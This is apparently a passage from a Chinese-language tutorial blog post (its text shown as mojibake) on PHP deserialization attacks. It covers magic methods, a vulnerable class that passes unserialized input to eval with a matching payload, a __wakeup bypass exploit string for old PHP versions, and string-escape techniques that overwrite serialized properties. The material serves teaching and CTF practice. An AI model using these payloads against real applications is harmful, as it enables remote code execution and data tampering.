__<span class="token function">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼Œè®¾ç½®ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨

__<span class="token function">isset</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨<span class="token function">isset</span><span class="token punctuation">(</span><span class="token punctuation">)</span>æˆ–<span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span>æ—¶è°ƒç”¨

__<span class="token function">unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨<span class="token function">unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span>æ—¶è¢«è°ƒç”¨ã€‚

__<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼Œæ‰§è¡Œ<span class="token function">serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°

__<span class="token function">wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼Œæ‰§è¡Œ<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°

__<span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼Œç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶çš„å›åº”æ–¹æ³•

__<span class="token function">invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼Œè°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³•

__set_<span class="token function">state</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼Œè°ƒç”¨var_<span class="token function">export</span><span class="token punctuation">(</span><span class="token punctuation">)</span>å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚

__<span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼Œå½“å¯¹è±¡å¤åˆ¶å®Œæˆæ—¶è°ƒç”¨

__<span class="token function">autoload</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼Œå°è¯•åŠ è½½æœªå®šä¹‰çš„ç±»

__<span class="token function">debugInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼Œæ‰“å°æ‰€éœ€è°ƒè¯•ä¿¡æ¯<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>(1) <code>__construct()</code>ï¼šå½“å¯¹è±¡åˆ›å»ºæ—¶ä¼šè‡ªåŠ¨è°ƒç”¨(ä½†åœ¨unserialize()æ—¶æ˜¯ä¸ä¼šè‡ªåŠ¨è°ƒç”¨çš„)ã€‚<br />
(2) <code>__wakeup()</code> ï¼šunserialize()æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨<br />
(3) <code>__destruct()</code>ï¼šå½“å¯¹è±¡è¢«é”€æ¯æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ã€‚<br />
(4) <code>__toString()</code>:å½“ååºåˆ—åŒ–åçš„å¯¹è±¡è¢«è¾“å‡ºåœ¨æ¨¡æ¿ä¸­çš„æ—¶å€™ï¼ˆè½¬æ¢æˆå­—ç¬¦ä¸²çš„æ—¶å€™ï¼‰è‡ªåŠ¨è°ƒç”¨<br />
(5) <code>__get()</code> :å½“ä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®<br />
(6) <code>__call()</code>: åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</p>
<p>å…¶ä¸­ç‰¹åˆ«è¯´æ˜ä¸€ä¸‹ç¬¬å››ç‚¹ï¼š</p>
<p>è¿™ä¸ª __toString è§¦å‘çš„æ¡ä»¶æ¯”è¾ƒå¤šï¼Œä¹Ÿå› ä¸ºè¿™ä¸ªåŸå› å®¹æ˜“è¢«å¿½ç•¥ï¼Œå¸¸è§çš„è§¦å‘æ¡ä»¶æœ‰ä¸‹é¢å‡ ç§</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span> æ‰“å°æ—¶ä¼šè§¦å‘

<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>ååºåˆ—åŒ–å¯¹è±¡ä¸å­—ç¬¦ä¸²è¿æ¥æ—¶

<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>ååºåˆ—åŒ–å¯¹è±¡å‚ä¸æ ¼å¼åŒ–å­—ç¬¦ä¸²æ—¶

<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>ååºåˆ—åŒ–å¯¹è±¡ä¸å­—ç¬¦ä¸²è¿›è¡Œ<span class="token operator">==</span>æ¯”è¾ƒæ—¶ï¼ˆ<span class="token constant">PHP</span>è¿›è¡Œ<span class="token operator">==</span>æ¯”è¾ƒçš„æ—¶å€™ä¼šè½¬æ¢å‚æ•°ç±»å‹ï¼‰

<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>ååºåˆ—åŒ–å¯¹è±¡å‚ä¸æ ¼å¼åŒ–<span class="token constant">SQL</span>è¯­å¥ï¼Œç»‘å®šå‚æ•°æ—¶

<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>ååºåˆ—åŒ–å¯¹è±¡åœ¨ç»è¿‡phpå­—ç¬¦ä¸²å‡½æ•°ï¼Œå¦‚ <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ã€<span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token punctuation">)</span>æ—¶

<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>åœ¨<span class="token function">in_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span>æ–¹æ³•ä¸­ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ååºåˆ—åŒ–å¯¹è±¡ï¼Œç¬¬äºŒä¸ªå‚æ•°çš„æ•°ç»„ä¸­æœ‰toStringè¿”å›çš„å­—ç¬¦ä¸²çš„æ—¶å€™toStringä¼šè¢«è°ƒç”¨

<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>ååºåˆ—åŒ–çš„å¯¹è±¡ä½œä¸º <span class="token function">class_exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span> çš„å‚æ•°çš„æ—¶å€™<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="å¸¸è§æ”»å‡»"><a class="markdownIt-Anchor" href="#å¸¸è§æ”»å‡»"></a> å¸¸è§æ”»å‡»</h2>
<h3 id="ä¾‹é¢˜1"><a class="markdownIt-Anchor" href="#ä¾‹é¢˜1"></a> ä¾‹é¢˜1</h3>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">K0rz3n</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$K0rz3n</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"i am K0rz3n"</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token this keyword">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">L</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token this keyword">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token operator">-></span><span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">L</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Welcome to XDSEC"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Evil</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">var</span> <span class="token variable">$test2</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token this keyword">$this</span><span class="token operator">-></span><span class="token property">test2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ç”±äºååºåˆ—åŒ–ï¼Œæˆ‘ä»¬å¯ä»¥å¯æ§ç±»é‡Œé¢çš„å‚æ•°ï¼Œåªè¦<code>test2</code>æ›´æ”¹ä¸ºæ¶æ„ä»£ç å°±å¯ä»¥åˆ©ç”¨<code>K0rz3n</code>è¿›è¡Œæ‰§è¡Œ</p>
<p>payload</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">K0rz3n</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token this keyword">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Evil</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">class</span> <span class="token class-name-definition class-name">Evil</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">var</span> <span class="token variable">$test2</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"phpinfo();"</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>

<span class="token variable">$K0rz3n</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">K0rz3n</span><span class="token punctuation">;</span>
<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$K0rz3n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"seria.txt"</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<img src="/2024/07/01/%E5%88%9D%E8%AF%86PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240703165137530.png" class="" alt="image-20240703165137530" loading="lazy">
<p>æ›´å¤æ‚çš„åˆ©ç”¨æ˜¯è¦æ„é€ é“¾å­æ¥è¿›è¡Œåˆ©ç”¨</p>
<p>å³POPé“¾</p>
<h3 id="__wakeupå‡½æ•°ç»•è¿‡"><a class="markdownIt-Anchor" href="#__wakeupå‡½æ•°ç»•è¿‡"></a> __wakeup()å‡½æ•°ç»•è¿‡</h3>
<p>æ¼æ´å½±å“ç‰ˆæœ¬</p>
<p>PHP5 &lt; 5.6.25</p>
<p>PHP7 &lt; 7.0.10</p>
<p>æ¼æ´åŸç†åŠè¦ç‚¹</p>
<p>__wakeup()å‡½æ•°è§¦å‘äºunserilize()è°ƒç”¨ä¹‹å‰ï¼Œä½†æ˜¯å¦‚æœè¢«ååºåˆ—è¯çš„å­—ç¬¦ä¸²å…¶ä¸­å¯¹åº”çš„å¯¹è±¡çš„å±æ€§ä¸ªæ•°å‘ç”Ÿå˜åŒ–æ—¶ï¼Œä¼šå¯¼è‡´ååºåˆ—åŒ–å¤±è´¥è€ŒåŒæ—¶ä½¿å¾— __wakeup()å‡½æ•°å¤±æ•ˆã€‚å½“æˆå‘˜å±æ€§æ•°ç›®å¤§äºå®é™…æ•°ç›®æ—¶ä¼šè·³è¿‡ __wakeup()å‡½æ•°çš„æ‰§è¡Œã€‚</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">obj</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span>

<span class="token keyword">var</span> <span class="token variable">$data</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function-definition function">serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

<span class="token keyword">return</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token this keyword">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

<span class="token this keyword">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>

<span class="token variable">$inner</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'a:1:&#123;i:0;O:9:"Exception":2:&#123;s:7:"'</span><span class="token operator">.</span><span class="token string double-quoted-string">""</span><span class="token operator">.</span><span class="token string single-quoted-string">'*'</span><span class="token operator">.</span><span class="token string double-quoted-string">""</span><span class="token operator">.</span><span class="token string single-quoted-string">'file";R:4;&#125;'</span><span class="token punctuation">;</span>

<span class="token variable">$exploit</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'a:2:&#123;i:0;C:3:"obj":'</span><span class="token operator">.</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$inner</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">':&#123;'</span><span class="token operator">.</span><span class="token variable">$inner</span><span class="token operator">.</span><span class="token string single-quoted-string">'&#125;i:1;R:4;&#125;'</span><span class="token punctuation">;</span>

<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$exploit</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸"><a class="markdownIt-Anchor" href="#ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸"></a> ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</h3>
<h4 id="å‰ç½®çŸ¥è¯†"><a class="markdownIt-Anchor" href="#å‰ç½®çŸ¥è¯†"></a> å‰ç½®çŸ¥è¯†ï¼š</h4>
<p>ç‰¹ç‚¹1ï¼šphpåœ¨ååºåˆ—åŒ–æ—¶ï¼Œåº•å±‚ä»£ç æ˜¯ä»¥ ; ä½œä¸ºå­—æ®µçš„åˆ†éš”ï¼Œä»¥ } ä½œä¸ºç»“å°¾ï¼Œå¹¶ä¸”æ˜¯æ ¹æ®é•¿åº¦åˆ¤æ–­å†…å®¹çš„ ï¼ŒåŒæ—¶ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­å¿…é¡»ä¸¥æ ¼æŒ‰ç…§åºåˆ—åŒ–è§„åˆ™æ‰èƒ½æˆåŠŸå®ç°ååºåˆ—åŒ– ï¼Œè¶…å‡ºçš„éƒ¨åˆ†å¹¶ä¸ä¼šè¢«ååºåˆ—åŒ–æˆåŠŸï¼Œè¿™è¯´æ˜ååºåˆ—åŒ–çš„è¿‡ç¨‹æ˜¯æœ‰ä¸€å®šè¯†åˆ«èŒƒå›´çš„ï¼Œåœ¨è¿™ä¸ªèŒƒå›´ä¹‹å¤–çš„å­—ç¬¦éƒ½ä¼šè¢«å¿½ç•¥ï¼Œä¸å½±å“ååºåˆ—åŒ–çš„æ­£å¸¸è¿›è¡Œã€‚è€Œä¸”å¯ä»¥çœ‹åˆ°ååºåˆ—åŒ–å­—ç¬¦ä¸²éƒ½æ˜¯ä»¥<code>&quot;;&#125;\</code>ç»“æŸçš„ï¼Œé‚£å¦‚æœæŠŠ<code>&quot;;&#125;\</code>æ·»å…¥åˆ°éœ€è¦ååºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸­ï¼ˆé™¤äº†ç»“å°¾å¤„ï¼‰ï¼Œå°±èƒ½è®©ååºåˆ—åŒ–æå‰é—­åˆç»“æŸï¼Œåé¢çš„å†…å®¹å°±ç›¸åº”çš„ä¸¢å¼ƒäº†ã€‚<br />
ç‰¹ç‚¹2ï¼šé•¿åº¦ä¸å¯¹åº”ä¼šæŠ¥é”™</p>
<p>æ¼æ´äº§ç”Ÿï¼šååºåˆ—åŒ–ä¹‹æ‰€ä»¥å­˜åœ¨å­—ç¬¦é€ƒé€¸ï¼Œæœ€ä¸»è¦çš„åŸå› æ˜¯ä»£ç ä¸­å­˜åœ¨é’ˆå¯¹åºåˆ—åŒ–ï¼ˆserialize()ï¼‰åçš„å­—ç¬¦ä¸²è¿›è¡Œäº†è¿‡æ»¤æ“ä½œï¼ˆå˜å¤šæˆ–è€…å˜å°‘ï¼‰ã€‚</p>
<p>æ¼æ´å¸¸è§æ¡ä»¶ï¼šåºåˆ—åŒ–åè¿‡æ»¤å†å»ååºåˆ—åŒ–</p>
<h4 id="ä¸€æ›¿æ¢ä¿®æ”¹åå¯¼è‡´åºåˆ—åŒ–å­—ç¬¦ä¸²å˜é•¿"><a class="markdownIt-Anchor" href="#ä¸€æ›¿æ¢ä¿®æ”¹åå¯¼è‡´åºåˆ—åŒ–å­—ç¬¦ä¸²å˜é•¿"></a> ä¸€æ›¿æ¢ä¿®æ”¹åå¯¼è‡´åºåˆ—åŒ–å­—ç¬¦ä¸²å˜é•¿</h4>
<p>ç¤ºä¾‹ä»£ç ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bb'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ccc'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span>
<span class="token punctuation">&#123;</span>
        <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'aaaa'</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'123456'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$AA</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$AA</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$AA</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$res</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ç”±äºè¯¥ä»£ç ä¸­ï¼Œè¾“å…¥çš„å¯¹è±¡ç”¨æˆ·ä¸å¯æ§ï¼Œåˆ©ç”¨å­—ç¬¦ä¸²é€ƒé€¸æˆ‘ä»¬ä»ç„¶å¯ä»¥ä¿®æ”¹å±æ€§å€¼</p>
<p>å› ä¸ºç»è¿‡<code>filter</code>å</p>
<p>ç”±äºå±æ€§çš„é•¿åº¦ï¼Œç»è¿‡phpååºåˆ—åŒ–è§£æï¼Œæ¯å½“å­—ç¬¦ä¸²å­˜åœ¨ä¸€ä¸ª<code>bb</code>å°±ä¼šé€ƒé€¸ä¸€ä¸ªå­—ç¬¦ï¼Œå¦‚æœé€ƒé€¸çš„å­—ç¬¦ä¸­å­˜åœ¨<code>;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;</code></p>
<p>ä¼šå¯¼è‡´è§£ææå‰é—­åˆï¼Œè¿›è€Œé—´æ¥ä¿®æ”¹å±æ€§<code>pass</code></p>
<h4 id="äºŒæ›¿æ¢ä¹‹åå¯¼è‡´åºåˆ—åŒ–å­—ç¬¦ä¸²å˜çŸ­"><a class="markdownIt-Anchor" href="#äºŒæ›¿æ¢ä¹‹åå¯¼è‡´åºåˆ—åŒ–å­—ç¬¦ä¸²å˜çŸ­"></a> äºŒæ›¿æ¢ä¹‹åå¯¼è‡´åºåˆ—åŒ–å­—ç¬¦ä¸²å˜çŸ­</h4>
<p>ç¤ºä¾‹ä»£ç </p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function-definition function">str_rep</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'/php|test/'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$test</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$test</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sign'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sign'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
<span class="token variable">$test</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'number'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'2020'</span><span class="token punctuation">;</span>
<span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">str_rep</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$fake</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"name:"</span><span class="token operator">.</span><span class="token variable">$fake</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sign:"</span><span class="token operator">.</span><span class="token variable">$fake</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sign'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"number:"</span><span class="token operator">.</span><span class="token variable">$fake</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'number'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯è¦åˆ©ç”¨è¿™ä¸ª<code>str_rep</code>ï¼Œé€šè¿‡è¾“å…¥<code>name</code>å’Œ<code>sign</code>æ¥é—´æ¥ä¿®æ”¹<code>number</code>çš„å€¼</p>
<p>æ€è·¯</p>
<p>ç”±äºnameå¯ä»¥è¿›è¡Œè¦†ç›–ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨nameè¦†ç›–æ‰signçš„å‰éƒ¨åˆ†å€¼ï¼Œç„¶åä¸­é—´éƒ¨åˆ†ç”¨æ¥é—­åˆå‰é¢çš„å±æ€§å€¼ï¼Œåé¢éƒ¨åˆ†ç”¨æ¥è¦†ç›–numberå€¼å¹¶æå‰é—­åˆ</p>
<p>æˆ‘ä»¬è¦ä¿®æ”¹numberçš„å€¼ï¼Œå°±è¦åœ¨signä¸­åŠ å…¥<code>&quot;;s:6:&quot;number&quot;;s:4:&quot;2000&quot;;&#125;</code>é•¿åº¦ä¸º27</p>
